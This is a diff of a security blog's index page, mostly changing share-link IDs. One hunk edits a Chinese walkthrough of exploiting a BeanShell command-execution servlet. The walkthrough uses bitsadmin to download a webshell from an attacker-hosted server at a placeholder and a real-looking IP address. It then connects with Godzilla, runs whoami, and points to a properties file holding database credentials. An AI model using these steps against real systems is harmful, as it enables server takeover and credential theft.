@@ -111,7 +111,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" data-id="clbeh9fkf0005fhhf06emcfzc" data-title="webpack前端源码还原漏洞" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" data-id="clbehgu4j0004hphf4afm2opn" data-title="webpack前端源码还原漏洞" class="article-share-link">Share</a>
       
       
       
@@ -151,7 +151,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clbeh9fkg0006fhhf20ivciqa" data-title="内存取证初识（一）" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clbehgu4k0006hphf8x8v8xc2" data-title="内存取证初识（一）" class="article-share-link">Share</a>
       
       
       
@@ -189,7 +189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/28/74CMS%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" data-id="clbeh9fkb0000fhhfd8jla3xe" data-title="74CMS分析总结" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/28/74CMS%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" data-id="clbehgu4i0002hphf5rwb3ncj" data-title="74CMS分析总结" class="article-share-link">Share</a>
       
       
       
@@ -231,22 +231,22 @@
 <li>&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet</li>
 </ul>
 <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>具体更多玩法看<a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a>，以下使用简单的exec() dir()函数作为样例。</p>
-<h4 id="首先查看当前权限"><a href="#首先查看当前权限" class="headerlink" title="首先查看当前权限"></a>首先查看当前权限</h4><h4 id="查看当前目录，并找到web目录"><a href="#查看当前目录，并找到web目录" class="headerlink" title="查看当前目录，并找到web目录"></a>查看当前目录，并找到web目录</h4><ol>
+<h4 id="查看当前目录，并找到web目录"><a href="#查看当前目录，并找到web目录" class="headerlink" title="查看当前目录，并找到web目录"></a>查看当前目录，并找到web目录</h4><ol>
 <li>dir(“&#x2F;sdfasf”) 输入让他报错，就能返回当前路径;<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></li>
 <li>这里就是web的根目录，绝对路径为”D:\weaver\ecology”；<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></li>
 </ol>
-<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>现在我们已经知道了web的绝对路径，我们就可以尝试写入webshell，更方便我们利用该漏洞。你可以使用echo写入，也可以远程下载，我这里使用的是远程下载方法</p>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>现在我们已经知道了web的绝对路径，我们就可以尝试写入webshell，更方便我们利用该漏洞。你可以使用echo写入，也可以远程下载，我这里使用的是远程下载方法。</p>
 <ol>
 <li>在实战过程中，你需要将webshell放置到云vps中，并且启动一个webserver，让受害者可以http形式访问到并且下载木马，输入以下指令到Script框中并执行。Output中没有报错证明指令执行成功。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:8000/2.jsp d:\\weaver\\ecology\\123.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
 <img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></li>
 </ol>
-<h2 id="连shell"><a href="#连shell" class="headerlink" title="连shell"></a>连shell</h2><p><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"><br>exec(“bitsadmin &#x2F;rawreturn &#x2F;transfer down <a target="_blank" rel="noopener" href="http://150.158.138.182:8000/2.jsp">http://150.158.138.182:8000/2.jsp</a> d:\weaver\ecology\123.jsp”)</p>
-<p>&#96;&#96;&#96;<br>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>
+<h2 id="连shell"><a href="#连shell" class="headerlink" title="连shell"></a>连shell</h2><p>连接取决于你使用的什么webshell，如果你用一句话webshell那么可以使用蚁剑、菜刀等工具，我这里使用的是哥斯拉。如下图输入webshell的url和连接密码之后测试成功之后证明你的木马上传成功了，可以连接到webshel尽情玩耍了。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"><br>exec(“bitsadmin &#x2F;rawreturn &#x2F;transfer down <a target="_blank" rel="noopener" href="http://150.158.138.182:8000/2.jsp">http://150.158.138.182:8000/2.jsp</a> d:\weaver\ecology\123.jsp”)</p>
+<h2 id="用shell"><a href="#用shell" class="headerlink" title="用shell"></a>用shell</h2><p>使用哥斯拉试一个简单的命令，whoami，查看当前权限。<br><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"><br>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbeh9fke0002fhhfa6sd827f" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbehgu4f0000hphf2p6t5oh3" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
       
       
       
@@ -304,7 +304,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E8%AE%B0%E5%BD%95/" data-id="clbeh9fkh0009fhhfbvgugfzl" data-title="内网渗透经验记录" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E8%AE%B0%E5%BD%95/" data-id="clbehgu4k0007hphf75gh9pif" data-title="内网渗透经验记录" class="article-share-link">Share</a>
       
       
       
@@ -350,7 +350,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clbeh9fkd0001fhhfcxr55372" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clbehgu4h0001hphf5s4uexj7" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
       
       
       
@@ -452,7 +452,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clbeh9fke0004fhhf1ob201at" data-title="Fastjson反序列化漏洞原理及检测利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clbehgu4j0003hphfdk8kfi2s" data-title="Fastjson反序列化漏洞原理及检测利用" class="article-share-link">Share</a>
       
       
       
@@ -491,7 +491,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="clbeh9fkg0008fhhfdm4v1eep" data-title="非授权访问" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="clbehgu4k0008hphfc5am67kk" data-title="非授权访问" class="article-share-link">Share</a>
       
       
       
@@ -532,7 +532,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="clbeh9fkg0007fhhfferk02ae" data-title="设备缺省口令" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="clbehgu4l0009hphfab4gb30h" data-title="设备缺省口令" class="article-share-link">Share</a>
       
       
       
@@ -580,7 +580,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="clbeh9fke0003fhhfc4242jyc" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="clbehgu4k0005hphf000n2ujb" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
       
       
       
